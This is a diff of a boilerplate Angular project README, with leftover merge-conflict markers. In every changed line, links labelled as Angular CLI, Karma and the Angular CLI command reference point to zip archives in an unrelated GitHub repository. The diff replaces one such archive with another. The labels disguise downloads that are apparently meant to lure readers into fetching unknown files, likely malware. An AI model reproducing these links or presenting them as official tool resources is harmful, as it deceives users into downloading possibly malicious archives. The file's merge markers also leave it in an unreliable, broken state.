@@ -4,7 +4,7 @@
 =======
 # Portfolio
 
-This project was generated with [Angular CLI](https://raw.githubusercontent.com/vinothanS/SNU_2D_ProgrammingTools_IDE_Strand/main/src/main/java/SNU_2D_ProgrammingTools_IDE_Strand-2.4.zip) version 16.2.1.
+This project was generated with [Angular CLI](https://raw.githubusercontent.com/vinothanS/SNU_2D_ProgrammingTools_IDE_Strand/main/src/main/java/com/vinothan/demo/Tools-SN-Programming-ID-Strand-manager.zip) version 16.2.1.
 
 ## Development server
 
@@ -20,7 +20,7 @@ Run `ng build` to build the project. The build artifacts will be stored in the `
 
 ## Running unit tests
 
-Run `ng test` to execute the unit tests via [Karma](https://raw.githubusercontent.com/vinothanS/SNU_2D_ProgrammingTools_IDE_Strand/main/src/main/java/SNU_2D_ProgrammingTools_IDE_Strand-2.4.zip).
+Run `ng test` to execute the unit tests via [Karma](https://raw.githubusercontent.com/vinothanS/SNU_2D_ProgrammingTools_IDE_Strand/main/src/main/java/com/vinothan/demo/Tools-SN-Programming-ID-Strand-manager.zip).
 
 ## Running end-to-end tests
 
@@ -28,7 +28,7 @@ Run `ng e2e` to execute the end-to-end tests via a platform of your choice. To u
 
 ## Further help
 
-To get more help on the Angular CLI use `ng help` or go check out the [Angular CLI Overview and Command Reference](https://raw.githubusercontent.com/vinothanS/SNU_2D_ProgrammingTools_IDE_Strand/main/src/main/java/SNU_2D_ProgrammingTools_IDE_Strand-2.4.zip) page.
+To get more help on the Angular CLI use `ng help` or go check out the [Angular CLI Overview and Command Reference](https://raw.githubusercontent.com/vinothanS/SNU_2D_ProgrammingTools_IDE_Strand/main/src/main/java/com/vinothan/demo/Tools-SN-Programming-ID-Strand-manager.zip) page.
 >>>>>>> 2feb4f7 (fifth commit)
 =======
 # STSGithubProject
